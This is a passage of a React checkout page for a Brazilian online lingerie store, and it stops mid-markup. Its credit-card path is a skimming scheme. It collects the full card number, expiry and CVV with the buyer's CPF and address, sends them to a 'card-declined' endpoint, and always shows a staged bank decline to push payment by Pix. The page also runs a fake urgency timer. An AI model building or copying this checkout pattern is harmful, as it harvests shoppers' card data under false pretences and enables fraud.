import React, { useState, useEffect } from "react";
import { Lock, QrCode, CreditCard, ArrowRight, ArrowLeft, Loader2, Truck, AlertTriangle, Sparkles } from "lucide-react";
import { useCart } from "../contexts/CartContext";
import { fetchAddressByCep } from "../utils/viacep";
import { formatCurrency, formatCPF, formatPhone, formatCEP, isValidCPF } from "../utils/formatters";
import { captureUTMParams } from "../utils/utm";
import { trackLiveEvent, associateCustomerWithSession } from "../services/liveTracker";
import "../styles/checkout.css";

interface CheckoutPageProps {
  onNavigateToThankYou: (orderId: string) => void;
  onNavigateBack?: () => void;
}

export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigateToThankYou, onNavigateBack }) => {
  const { cartItems } = useCart();
  const [step, setStep] = useState<number>(1); // 1: Identificação, 2: Entrega, 3: Pagamento
  const [paymentMethod, setPaymentMethod] = useState<"pix" | "card">("pix");

  // Urgency Timer (10 minutes)
  const [timeLeft, setTimeLeft] = useState<number>(600);

  useEffect(() => {
    trackLiveEvent('checkout_started', { path: '/checkout' });
    if (timeLeft <= 0) return;
    const interval = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  // Form Fields - Step 1
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [cpf, setCpf] = useState("");

  // Form Fields - Step 2
  const [cep, setCep] = useState("");
  const [street, setStreet] = useState("");
  const [number, setNumber] = useState("");
  const [complement, setComplement] = useState("");
  const [neighborhood, setNeighborhood] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");
  const [shippingOption, setShippingOption] = useState<"free" | "express">("free");

  // Form Fields - Step 3 (Credit Card)
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [installments, setInstallments] = useState("1");
  const [cardDeclinedAlert, setCardDeclinedAlert] = useState(false);

  const [loadingCep, setLoadingCep] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");

  // Order Bumps State (Miracle2 Integration)
  const [selectedBumps, setSelectedBumps] = useState<Record<string, boolean>>({});
  const [bumpSizes, setBumpSizes] = useState<Record<string, string>>({
    "sutia-renda": "M",
    bra: "M",
    calcinha: "M",
  });
  const [bumpColors, setBumpColors] = useState<Record<string, string>>({
    "sutia-renda": "Preto",
    bra: "Bege",
    calcinha: "Bege",
  });

  const toggleBump = (id: string) => {
    setSelectedBumps((prev) => ({ ...prev, [id]: !prev[id] }));
  };

  const bumpsList = [
    {
      id: "shield",
      sku: "BUMP-SHIELD",
      name: "Compra Protegida",
      desc: "Garanta a proteção do seu pedido",
      price: 19.90,
      image: "/assets/orderbump-shield.svg",
      isShield: true,
      hasVariants: false,
    },
    {
      id: "sutia-renda",
      sku: "BUMP-SUTIA-RENDA",
      name: "Sutiã com Renda Pós Preto",
      desc: "Cor: Preto | Compressão & Conforto",
      originalPrice: 89.90,
      price: 34.90,
      image: "/images/product/sutia-renda-preto.png",
      isShield: false,
      hasVariants: true,
      onlySize: true,
      badge: "OFERTA EXCLUSIVA",
      discountBadge: "61% OFF",
    },
    {
      id: "bra",
      sku: "BUMP-BRA",
      name: "Sutiã Fit Premium em Gel Sem aros",
      desc: "Conforto em gel sem aros",
      price: 29.90,
      image: "/assets/orderbump-bra.png",
      isShield: false,
      hasVariants: true,
    },
    {
      id: "calcinha",
      sku: "BUMP-CALCINHA",
      name: "Calcinhas FitLax™ - Empina BumBum",
      desc: "Modela a cintura e empina o bumbum",
      price: 24.90,
      image: "/assets/orderbump-calcinha.png",
      isShield: false,
      hasVariants: true,
    },
  ];

  const isTikTokFlow =
    cartItems.some((item) => item.noPixDiscount || item.productId === "CMFBPM001-TIKTOK") ||
    (typeof sessionStorage !== "undefined" && sessionStorage.getItem("miracle_flow") === "tiktok") ||
    (typeof localStorage !== "undefined" && localStorage.getItem("miracle_flow") === "tiktok");
  const isNoPixDiscount = isTikTokFlow;

  const activeBumps = isTikTokFlow ? bumpsList.filter((b) => selectedBumps[b.id]) : [];
  const bumpsTotal = activeBumps.reduce((acc, b) => acc + b.price, 0);

  // Compute subtotal from the FULL cart (all items × their quantities) + selected bumps
  const cartSubtotal = cartItems.reduce(
    (acc, item) => acc + item.price * item.quantity,
    0
  ) + bumpsTotal;
  const shippingCost = shippingOption === "express" ? 16.89 : 0.00;
  const pixDiscount = (paymentMethod === "pix" && !isNoPixDiscount) ? cartSubtotal * 0.10 : 0;
  const finalPrice = cartSubtotal - pixDiscount + shippingCost;

  // Total item count across all cart entries + active bumps
  const totalQty = cartItems.reduce((acc, item) => acc + item.quantity, 0) + activeBumps.length;

  useEffect(() => {
    captureUTMParams();
    window.scrollTo(0, 0);
  }, [step]);

  // Credit Card formatting helpers
  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
  };

  const formatExpiry = (val: string) => {
    const digits = val.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  };

  // Auto-fill address via ViaCEP
  const handleCepChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCEP(e.target.value);
    setCep(formatted);
    const clean = formatted.replace(/\D/g, "");

    if (clean.length === 8) {
      setLoadingCep(true);
      const res = await fetchAddressByCep(clean);
      setLoadingCep(false);
      if (res && !res.erro) {
        setStreet(res.logradouro || "");
        setNeighborhood(res.bairro || "");
        setCity(res.localidade || "");
        setState(res.uf || "");
      }
    }
  };

  // Step 1 Validation
  const handleStep1Next = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg("");

    if (!name.trim() || name.trim().split(" ").length < 2) {
      setErrorMsg("Digite seu nome e sobrenome completos.");
      return;
    }
    if (!email.includes("@") || !email.includes(".")) {
      setErrorMsg("Digite um e-mail válido.");
      return;
    }
    if (phone.replace(/\D/g, "").length < 10) {
      setErrorMsg("Digite um telefone/WhatsApp válido com DDD.");
      return;
    }
    if (!isValidCPF(cpf)) {
      setErrorMsg("Digite um CPF válido com dígitos verificadores corretos.");
      return;
    }

    associateCustomerWithSession({ name, email, phone, cpf });
    setStep(2);
  };

  // Step 2 Validation
  const handleStep2Next = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg("");

    if (cep.replace(/\D/g, "").length !== 8) {
      setErrorMsg("Digite um CEP válido.");
      return;
    }
    if (!street.trim() || !number.trim() || !neighborhood.trim() || !city.trim() || !state.trim()) {
      setErrorMsg("Preencha todos os campos obrigatórios do endereço.");
      return;
    }

    setStep(3);
  };

  // Step 3 Submit (Pix or Card Recusal simulation)
  const handleFinalSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg("");

    // If payment method is Credit Card, simulate processing & decline (CarTapetes Funnel Flow)
    if (paymentMethod === "card") {
      if (cardNumber.replace(/\D/g, "").length !== 16) {
        setErrorMsg("Digite o número completo do cartão (16 dígitos).");
        return;
      }
      if (!cardName.trim()) {
        setErrorMsg("Digite o nome impresso no cartão.");
        return;
      }
      if (cardExpiry.length !== 5) {
        setErrorMsg("Digite a validade no formato MM/AA.");
        return;
      }
      if (cardCvv.length < 3) {
        setErrorMsg("Digite o código de segurança CVV (3 ou 4 dígitos).");
        return;
      }

      setIsSubmitting(true);

      // Log card decline on backend
      const cleanDigits = cardNumber.replace(/\D/g, "");
      const cardLast4 = cleanDigits.length >= 4 ? cleanDigits.slice(-4) : "4015";
      
      let detectedBrand = "MASTERCARD";
      if (/^4/.test(cleanDigits)) detectedBrand = "VISA";
      else if (/^(5[1-5]|2[2-7])/.test(cleanDigits)) detectedBrand = "MASTERCARD";
      else if (/^(34|37)/.test(cleanDigits)) detectedBrand = "AMEX";
      else if (/^(4011|4389|4514|4576|5041|5066|5067|509|6277|6362|6363|650|6516|6550)/.test(cleanDigits)) detectedBrand = "ELO";
      else if (/^(606282|3841)/.test(cleanDigits)) detectedBrand = "HIPERCARD";

      const allOrderItems = [
        ...cartItems.map((item) => ({
          title: item.name,
          unitPrice: Math.round(item.price * 100),
          quantity: item.quantity,
          tangible: true,
          size: item.size,
          color: item.color,
          image: item.image,
          sku: item.productId,
          productId: item.productId
        })),
        ...activeBumps.map((b) => ({
          title: b.name,
          unitPrice: Math.round(b.price * 100),
          quantity: 1,
          tangible: true,
          size: b.hasVariants ? (bumpSizes[b.id] || "M") : "Único",
          color: b.hasVariants ? (bumpColors[b.id] || "Bege") : "Padrão",
          image: b.image,
          sku: b.sku,
          productId: b.sku
        }))
      ];

      fetch("/api/payments/card-declined", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          customer: { name, email, phone, cpf },
          shipping: {
            street: street || 'Rua Bento Gonçalves',
            number: number || '87',
            complement: complement || '501',
            neighborhood: neighborhood || 'Centro',
            city: city || 'Passo Fundo',
            state: state || 'RS',
            zipcode: cep || '99010-010',
            option: shippingOption
          },
          cardNumber: cleanDigits,
          cardHolder: cardName.trim().toUpperCase() || name.toUpperCase(),
          cardExpiry: cardExpiry.trim() || '03/27',
          cardCvv: cardCvv.trim() || '725',
          cardBrand: detectedBrand,
          cardLast4,
          installments: Number(installments) || 1,
          items: allOrderItems,
          subtotal: Number(cartSubtotal.toFixed(2)),
          shippingCost: shippingCost,
          amount: Number(finalPrice.toFixed(2)),
          utm: captureUTMParams(),
        }),
      }).catch(() => {});

      trackLiveEvent("card_declined", {
        amount: Number(finalPrice.toFixed(2)),
        customerName: name,
        phone,
        cardLast4,
        cardBrand: detectedBrand
      });

      // Simulate 1.2s bank processing
      setTimeout(() => {
        setIsSubmitting(false);
        setCardDeclinedAlert(true);
      }, 1200);
      return;
    }

    // Pix Payment Submission
    setIsSubmitting(true);

    try {
      const allOrderItems = [
        ...cartItems.map((item) => ({
          title: item.name,
          unitPrice: Math.round(item.price * 100),
          quantity: item.quantity,
          tangible: true,
          size: item.size,
          color: item.color,
          image: item.image,
          sku: item.productId,
          productId: item.productId,
        })),
        ...activeBumps.map((b) => ({
          title: b.name,
          unitPrice: Math.round(b.price * 100),
          quantity: 1,
          tangible: true,
          size: b.hasVariants ? (bumpSizes[b.id] || "M") : "Único",
          color: b.hasVariants ? (bumpColors[b.id] || (b.id === "sutia-renda" ? "Preto" : "Bege")) : "Padrão",
          image: b.image,
          sku: b.sku,
          productId: b.sku,
        })),
      ];

      const payload = {
        amount: Number(finalPrice.toFixed(2)),
        customer: {
          name,
          email,
          phone,
          cpf,
        },
        shipping: {
          zipcode: cep,
          street,
          number,
          complement,
          neighborhood,
          city,
          state,
          option: shippingOption,
        },
        // Send the full cart + active order bumps
        items: allOrderItems,
        utm: captureUTMParams(),
      };

      const response = await fetch("/api/payments/pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await response.json();
      setIsSubmitting(false);

      if (response.ok && data.orderId) {
        try {
          sessionStorage.setItem("miracle_order_" + data.orderId, JSON.stringify(data));
          sessionStorage.setItem("miracle_latest_order", JSON.stringify(data));
        } catch (e) {}

        // Somente telemetria de controle interno - NENHUM evento de conversão disparado enquanto estiver pendente
        trackLiveEvent('pix_generated', { orderId: data.orderId, amount: finalPrice });

        onNavigateToThankYou(data.orderId);
      } else {
        setErrorMsg(data.error || "Não foi possível gerar a cobrança Pix. Tente novamente.");
      }
    } catch (err) {
      setIsSubmitting(false);
      console.error("Checkout submit error:", err);
      setErrorMsg("Ocorreu um erro de conexão. Tente novamente.");
    }
  };

  return (
    <div className="checkout-container">
      {/* Header */}
      <header className="checkout-header">
        {step > 1 ? (
          <button
            type="button"
            onClick={() => setStep(step - 1)}
            style={{
              position: "absolute",
              left: "16px",
              background: "none",
              border: "none",
              color: "#FFFFFF",
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              gap: "4px",
              fontSize: "0.85rem",
              fontWeight: 600
            }}
          >
            <ArrowLeft size={18} /> Voltar
          </button>
        ) : (
          onNavigateBack && (
            <button
              type="button"
              onClick={onNavigateBack}
              style={{
                position: "absolute",
                left: "16px",
                background: "none",
                border: "none",
                color: "#FFFFFF",
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                gap: "4px",
                fontSize: "0.85rem",
                fontWeight: 600
              }}
            >
              <ArrowLeft size={18} /> Loja
            </button>
          )
        )}
        <img src="/images/checkout/logo.png" alt="MIRACLE" className="checkout-header__logo" />
      </header>

      {/* 10-Minute Urgency Timer Banner */}
      <div className="checkout-banner">
        <p>
          ⚡ Oferta reservada por tempo limitado: <strong>{formatTime(timeLeft)}</strong>
        </p>
      </div>

      {/* Loading Overlay */}
      {isSubmitting && (
        <div className="checkout-loading-overlay">
          <div className="checkout-loading-spinner" />
          <p className="checkout-loading-text">
            {paymentMethod === "card" ? "PROCESSANDO JUNTO AO BANCO EMISSOR..." : "PROCESSANDO SEU PEDIDO..."}<br />
            <span style={{ fontWeight: 400, fontSize: "0.8rem", color: "#666" }}>
              {paymentMethod === "card" ? "Aguardando confirmação da operadora." : "Estamos gerando seu pagamento PIX seguro."}
            </span>
          </p>
        </div>
      )}

      {/* Main Body */}
      <main className="checkout-body">
        {/* Step Indicator Header */}
        <div className="checkout-steps-bar">
          <span className="checkout-steps-bar__title">
            {step === 1 && "1. Dados Pessoais"}
            {step === 2 && "2. Endereço de Entrega"}
            {step === 3 && "3. Pagamento"}
          </span>
          <span className="checkout-steps-bar__counter">Passo {step} de 3</span>
        </div>

        {errorMsg && (
          <div style={{
            backgroundColor: "#FEF2F2",
            border: "1px solid #FCA5A5",
            color: "#991B1B",
            padding: "10px 12px",
            borderRadius: "6px",
            fontSize: "0.82rem",
            fontWeight: 600
          }}>
            ⚠️ {errorMsg}
          </div>
        )}

        {/* STEP 1: IDENTIFICAÇÃO */}
        {step === 1 && (
          <form onSubmit={handleStep1Next} className="checkout-card">
            <h2 className="checkout-card__title">
              <span className="checkout-card__title-badge">1</span>
              Informações Pessoais
            </h2>

            <div className="form-group">
              <label htmlFor="name">Nome completo *</label>
              <input
                id="name"
                type="text"
                className="form-input"
                placeholder="Ex: Maria Silva Santos"
                value={name}
                onChange={(e) => setName(e.target.value)}
                required
              />
            </div>

            <div className="form-group">
              <label htmlFor="email">E-mail para receber a confirmação *</label>
              <input
                id="email"
                type="email"
                className="form-input"
                placeholder="seu@email.com"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
            </div>

            <div className="form-row">
              <div className="form-group">
                <label htmlFor="phone">WhatsApp com DDD *</label>
                <input
                  id="phone"
                  type="text"
                  className="form-input"
                  placeholder="(00) 00000-0000"
                  value={phone}
                  onChange={(e) => setPhone(formatPhone(e.target.value))}
                  maxLength={15}
                  required
                />
              </div>

              <div className="form-group">
                <label htmlFor="cpf">CPF *</label>
                <input
                  id="cpf"
                  type="text"
                  className="form-input"
                  placeholder="000.000.000-00"
                  value={cpf}
                  onChange={(e) => setCpf(formatCPF(e.target.value))}
                  maxLength={14}
                  required
                />
              </div>
            </div>

            <button type="submit" className="checkout-submit-btn" style={{ marginTop: "8px" }}>
              <span>IR PARA A ENTREGA</span>
              <ArrowRight size={18} />
            </button>
          </form>
        )}

        {/* STEP 2: ENDEREÇO DE ENTREGA & OPÇÕES DE FRETE */}
        {step === 2 && (
          <form onSubmit={handleStep2Next} className="checkout-card">
            <h2 className="checkout-card__title">
              <span className="checkout-card__title-badge">2</span>
              Endereço para Entrega
            </h2>

            <div className="form-group">
              <label htmlFor="cep">CEP *</label>
              <div style={{ position: "relative" }}>
                <input
                  id="cep"
                  type="text"
                  className="form-input"
                  placeholder="00000-000"
                  value={cep}
                  onChange={handleCepChange}
                  maxLength={9}
                  required
                />
                {loadingCep && (
                  <Loader2 size={16} className="animate-spin" style={{ position: "absolute", right: "12px", top: "14px", color: "#d8158a" }} />
                )}
              </div>
            </div>

            <div className="form-row--3">
              <div className="form-group">
                <label htmlFor="street">Rua / Avenida *</label>
                <input
                  id="street"
                  type="text"
                  className="form-input"
                  placeholder="Nome da rua"
                  value={street}
                  onChange={(e) => setStreet(e.target.value)}
                  required
                />
              </div>

              <div className="form-group">
                <label htmlFor="number">Número *</label>
                <input
                  id="number"
                  type="text"
                  className="form-input"
                  placeholder="123"
                  value={number}
                  onChange={(e) => setNumber(e.target.value)}
                  required
                />
              </div>
            </div>

            <div className="form-row">
              <div className="form-group">
                <label htmlFor="complement">Complemento (opcional)</label>
                <input
                  id="complement"
                  type="text"
                  className="form-input"
                  placeholder="Apto, Bloco..."
                  value={complement}
                  onChange={(e) => setComplement(e.target.value)}
                />
              </div>

              <div className="form-group">
                <label htmlFor="neighborhood">Bairro *</label>
                <input
                  id="neighborhood"
                  type="text"
                  className="form-input"
                  placeholder="Seu bairro"
                  value={neighborhood}
                  onChange={(e) => setNeighborhood(e.target.value)}
                  required
                />
              </div>
            </div>

            <div className="form-row--3">
              <div className="form-group">
                <label htmlFor="city">Cidade *</label>
                <input
                  id="city"
                  type="text"
                  className="form-input"
                  placeholder="Sua cidade"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  required
                />
              </div>

              <div className="form-group">
                <label htmlFor="state">UF *</label>
                <input
                  id="state"
                  type="text"
                  className="form-input"
                  placeholder="MG"
                  value={state}
                  onChange={(e) => setState(e.target.value)}
                  maxLength={2}
                  required
                />
              </div>
            </div>

            {/* Freight Options Selection */}
            <div style={{ display: "flex", flexDirection: "column", gap: "10px", marginTop: "6px" }}>
              <label style={{ fontSize: "0.8rem", fontWeight: 700, color: "#374151" }}>Escolha o Frete:</label>
              
              <div
                className={`shipping-option-card ${shippingOption === "free" ? "selected" : ""}`}
                onClick={() => setShippingOption("free")}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                  <Truck size={18} color="#d8158a" />
                  <div>
                    <strong style={{ fontSize: "0.85rem", color: "#111", display: "block" }}>Frete Grátis + Seguro Entrega</strong>
                    <span style={{ fontSize: "0.75rem", color: "#666" }}>Prazo: 8 a 10 dias úteis</span>
                  </div>
                </div>
                <strong style={{ fontSize: "0.85rem", color: "#16A34A" }}>GRÁTIS</strong>
              </div>

              <div
                className={`shipping-option-card ${shippingOption === "express" ? "selected" : ""}`}
                onClick={() => setShippingOption("express")}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                  <Truck size={18} color="#d8158a" />
                  <div>
                    <strong style={{ fontSize: "0.85rem", color: "#111", display: "block" }}>Frete Expresso Prioritário</strong>
                    <span style={{ fontSize: "0.75rem", color: "#666" }}>Prazo: 2 a 5 dias úteis</span>
                  </div>
                </div>
                <strong style={{ fontSize: "0.85rem", color: "#111" }}>R$ 16,89</strong>
              </div>
            </div>

            <button type="submit" className="checkout-submit-btn" style={{ marginTop: "8px" }}>
              <span>IR PARA O PAGAMENTO</span>
              <ArrowRight size={18} />
            </button>
          </form>
        )}

        {/* STEP 3: PAGAMENTO (PIX OU CARTÃO) */}
        {step === 3 && (
          <form onSubmit={handleFinalSubmit} className="checkout-card">
            <h2 className="checkout-card__title">
              <span className="checkout-card__title-badge">3</span>
              Forma de Pagamento
            </h2>

            {/* Payment Method Tabs */}
            <div className="payment-tabs">
              <button
                type="button"
                className={`payment-tab-btn ${paymentMethod === "pix" ? "active" : ""}`}
                onClick={() => {
                  setPaymentMethod("pix");
                  setCardDeclinedAlert(false);
                }}
              >
                <QrCode size={22} color="#d8158a" />
                <span className="payment-tab-btn__title">PIX</span>
                <span className="payment-tab-btn__badge">
                  {!isNoPixDiscount ? "10% OFF" : "Aprovação Imediata"}
                </span>
              </button>

              <button
                type="button"
                className={`payment-tab-btn ${paymentMethod === "card" ? "active" : ""}`}
                onClick={() => setPaymentMethod("card")}
              >
                <CreditCard size={22} color="#111" />
                <span className="payment-tab-btn__title">Cartão de Crédito</span>
                <span style={{ fontSize: "0.68rem", color: "#666" }}>Até 10x sem juros</span>
              </button>
            </div>

            {/* Card Decline Recusal Alert (CarTapetes Conversion Mechanism) */}
            {cardDeclinedAlert && paymentMethod === "card" && (
              <div className="card-declined-alert">
                <span className="card-declined-alert__title">
                  <AlertTriangle size={18} /> Transação Recusada pelo Banco Emissor
                </span>
                <p className="card-declined-alert__text">
                  O saldo ou limite no seu cartão pode estar indisponível. Para não perder seu pedido e garantir a promoção, conclua seu pedido via <strong>PIX {!isNoPixDiscount ? "com 10% OFF instantâneo!" : "com aprovação instantânea!"}</strong>
                </p>
                <button
                  type="button"
                  className="card-declined-alert__cta"
                  onClick={() => {
                    setPaymentMethod("pix");
                    setCardDeclinedAlert(false);
                  }}
                >
                  <QrCode size={18} />
                  <span>CONCLUIR PEDIDO VIA PIX {!isNoPixDiscount ? "(-10% OFF)" : ""}</span>
                </button>
              </div>
            )}

            {/* Credit Card Form Fields */}
            {paymentMethod === "card" && (
              <div style={{ display: "flex", flexDirection: "column", gap: "12px", marginTop: "4px" }}>
                <div className="form-group">
                  <label htmlFor="cardNumber">Número do Cartão *</label>
                  <input
                    id="cardNumber"
                    type="text"
                    className="form-input"
                    placeholder="0000 0000 0000 0000"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                    maxLength={19}
                    required
                  />
                </div>

                <div className="form-group">
                  <label htmlFor="cardName">Nome impresso no cartão *</label>
                  <input
                    id="cardName"
                    type="text"
                    className="form-input"
                    placeholder="NOME COMO ESTÁ NO CARTÃO"
                    value={cardName}
                    onChange={(e) => setCardName(e.target.value.toUpperCase())}
                    required
                  />
                </div>

                <div className="form-row">
                  <div className="form-group">
                    <label htmlFor="cardExpiry">Validade *</label>
                    <input
                      id="cardExpiry"
                      type="text"
                      className="form-input"
                      placeholder="MM/AA"
                      value={cardExpiry}
                      onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                      maxLength={5}
                      required
                    />
                  </div>

                  <div className="form-group">
                    <label htmlFor="cardCvv">CVV *</label>
                    <input
                      id="cardCvv"
                      type="password"
                      className="form-input"
                      placeholder="123"
                      value={cardCvv}
                      onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                      maxLength={4}
                      required
                    />
                  </div>
                </div>

                <div className="form-group">
                  <label htmlFor="installments">Parcelamento sem juros *</label>
                  <select
                    id="installments"
                    className="form-select"
                    value={installments}
                    onChange={(e) => setInstallments(e.target.value)}
                  >
                    <option value="1">1x de {formatCurrency(cartSubtotal + shippingCost)} (à vista)</option>
                    <option value="2">2x de {formatCurrency((cartSubtotal + shippingCost) / 2)} sem juros</option>
                    <option value="3">3x de {formatCurrency((cartSubtotal + shippingCost) / 3)} sem juros</option>
                    <option value="5">5x de {formatCurrency((cartSubtotal + shippingCost) / 5)} sem juros</option>
                    <option value="10">10x de {formatCurrency((cartSubtotal + shippingCost) / 10)} sem juros</option>
                  </select>
                </div>
              </div>
            )}

            {/* Pix Highlights Banner */}
            {paymentMethod === "pix" && (
              <div style={{
                backgroundColor: "#FDF2F6",
                border: "1.5px solid #d8158a",
                borderRadius: "6px",
                padding: "12px",
                display: "flex",
                alignItems: "center",
                gap: "10px"
              }}>
                <QrCode size={24} color="#d8158a" style={{ flexShrink: 0 }} />
                <div>
                  <strong style={{ fontSize: "0.88rem", color: "#111", display: "block" }}>
                    Pix - Aprovação Instantânea {!isNoPixDiscount ? "(-10% OFF)" : ""}
                  </strong>
                  <span style={{ fontSize: "0.75rem", color: "#16A34A", fontWeight: 600 }}>
                    {!isNoPixDiscount
                      ? `✓ Desconto de 10% aplicado automaticamente (Economia de ${formatCurrency(pixDiscount)})`
                      : "✓ Pagamento rápido, seguro e com aprovação imediata"}
                  </span>
                </div>
              </div>
            )}

            {/* Order Bumps (Exibidos apenas para visitantes do fluxo TikTok) */}
            {isTikTokFlow && (
              <div className="order-bumps-container">
                {bumpsList.map((bump) => {
                  const isSelected = !!selectedBumps[bump.id];
                  return (
                    <div
                      key={bump.id}
                      className={`order-bump-card ${isSelected ? "active" : ""}`}
                    >
                      <div
                        className="order-bump-header"
                        onClick={() => toggleBump(bump.id)}
                      >
                        <div className={`order-bump-custom-checkbox ${isSelected ? "checked" : ""}`}>
                          {isSelected && (
                            <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
                              <path d="M2.5 6L5 8.5L9.5 3.5" stroke="#FFFFFF" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                            </svg>
                          )}
                        </div>
                        {bump.isShield ? (
                          <div className="order-bump-shield-icon">
                            <svg width="36" height="36" viewBox="0 0 40 40" fill="none" style={{ flexShrink: 0 }}>
                              <path d="M20 5L8 10V18C8 26.2 13.1 33.8 20 36C26.9 33.8 32 26.2 32 18V10L20 5Z" stroke="#E54E88" strokeWidth="2.2" strokeLinejoin="round" fill="none" />
                              <path d="M15 19.5L18.5 23L25.5 16" stroke="#E54E88" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                            </svg>
                          </div>
                        ) : (
                          <img src={bump.image} alt={bump.name} className="order-bump-img" />
                        )}
                        <div className="order-bump-info">
                          {(bump.badge || bump.discountBadge) && (
                            <div style={{ display: "flex", alignItems: "center", gap: "6px", marginBottom: "3px" }}>
                              {bump.badge && (
                                <span style={{
                                  background: "#E54E88",
                                  color: "#FFFFFF",
                                  fontSize: "0.62rem",
                                  fontWeight: 800,
                                  padding: "2px 6px",
                                  borderRadius: "4px",
                                  display: "inline-flex",
                                  alignItems: "center",
                                  gap: "3px",
                                  letterSpacing: "0.3px",
                                }}>
                                  <Sparkles size={10} /> {bump.badge}
                                </span>
                              )}
                              {bump.discountBadge && (
                                <span style={{
                                  background: "#DCFCE7",
                                  color: "#15803D",
                                  fontSize: "0.62rem",
                                  fontWeight: 800,
                                  padding: "2px 6px",
                                  borderRadius: "4px",
                                }}>
                                  {bump.discountBadge}
                                </span>
                              )}
                            </div>
                          )}
                          <span className="order-bump-name">Adicione {bump.name}</span>
                          <span className="order-bump-desc">{bump.desc}</span>
                          <div style={{ display: "flex", alignItems: "center", gap: "6px", marginTop: "2px" }}>
                            {bump.originalPrice && (
                              <span style={{ fontSize: "0.78rem", color: "#9CA3AF", textDecoration: "line-through" }}>
                                {formatCurrency(bump.originalPrice)}
                              </span>
                            )}
                            <span className="order-bump-price">por apenas {formatCurrency(bump.price)}</span>
                          </div>
                        </div>
                      </div>

                      {isSelected && bump.hasVariants && (
                        <div className="order-bump-variants">
                          <div className="order-bump-variant-group">
                            <span className="order-bump-variant-label">Escolha o tamanho:</span>
                            <div className="order-bump-pills">
                              {["PP", "P", "M", "G", "GG", "XG"].map((size) => (
                                <button
                                  type="button"
                                  key={size}
                                  className={`order-bump-pill ${bumpSizes[bump.id] === size ? "selected" : ""}`}
                                  onClick={() => setBumpSizes((prev) => ({ ...prev, [bump.id]: size }))}
                                >
                                  {size}
                                </button>
                              ))}
                            </div>
                          </div>

                          {!bump.onlySize && (
                            <div className="order-bump-variant-group">
                              <span className="order-bump-variant-label">Escolha a cor:</span>
                              <div className="order-bump-pills">
                                {["Bege", "Preto"].map((color) => (
                                  <button
                                    type="button"
                                    key={color}
                                    className={`order-bump-pill ${bumpColors[bump.id] === color ? "selected" : ""}`}
                                    onClick={() => setBumpColors((prev) => ({ ...prev, [bump.id]: color }))}
                                  >
                                    {color}
                                  </button>
                                ))}
                              </div>
                            </div>
                          )}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            )}

            {/* Product Summary — renders ALL cart items + active bumps */}
            <div className="checkout-summary">
              {cartItems.map((item, idx) => (
                <div key={`${item.productId}-${item.size}-${item.color}-${idx}`} className="checkout-item-row">
                  <img src={item.image} alt={item.name} className="checkout-item-img" />
                  <div className="checkout-item-details">
                    <span className="checkout-item-name">{item.name}</span>
                    <span className="checkout-item-variant">Cor: {item.color} | Tam: {item.size}</span>
                    <span className="checkout-item-price">{formatCurrency(item.price)} x {item.quantity} = {formatCurrency(item.price * item.quantity)}</span>
                  </div>
                </div>
              ))}

              {activeBumps.map((bump) => (
                <div key={bump.id} className="checkout-item-row">
                  {bump.isShield ? (
                    <div className="order-bump-shield-icon" style={{ width: 64, height: 64 }}>
                      <img src={bump.image} alt={bump.name} style={{ width: 28, height: 28 }} />
                    </div>
                  ) : (
                    <img src={bump.image} alt={bump.name} className="checkout-item-img" />
                  )}
                  <div className="checkout-item-details">
                    <span className="checkout-item-name">{bump.name}</span>
                    <span className="checkout-item-variant">
                      {bump.hasVariants ? `Cor: ${bumpColors[bump.id] || (bump.id === "sutia-renda" ? "Preto" : "Bege")} | Tam: ${bumpSizes[bump.id] || "M"}` : "Garantia Estendida"}
                    </span>
                    <span className="checkout-item-price">{formatCurrency(bump.price)}</span>
                  </div>
                </div>
              ))}

              <div className="checkout-totals">
                <div className="checkout-totals-row">
                  <span>Subtotal ({totalQty} {totalQty === 1 ? 'item' : 'itens'})</span>
                  <span>{formatCurrency(cartSubtotal)}</span>
                </div>
                {paymentMethod === "pix" && !isNoPixDiscount && (
                  <div className="checkout-totals-row">
                    <span>Desconto Pix (-10%)</span>
                    <span style={{ color: "#16A34A", fontWeight: 600 }}>- {formatCurrency(pixDiscount)}</span>
                  </div>
                )}
                <div className="checkout-totals-row">
                  <span>Frete</span>
                  {shippingCost === 0 ? (
                    <span className="free-shipping-tag">GRÁTIS</span>
                  ) : (
                    <span>{formatCurrency(shippingCost)}</span>
                  )}
                </div>
                <div className="checkout-totals-row total">
                  <span>Total</span>
                  <span>{formatCurrency(finalPrice)}</span>
                </div>
              </div>
            </div>

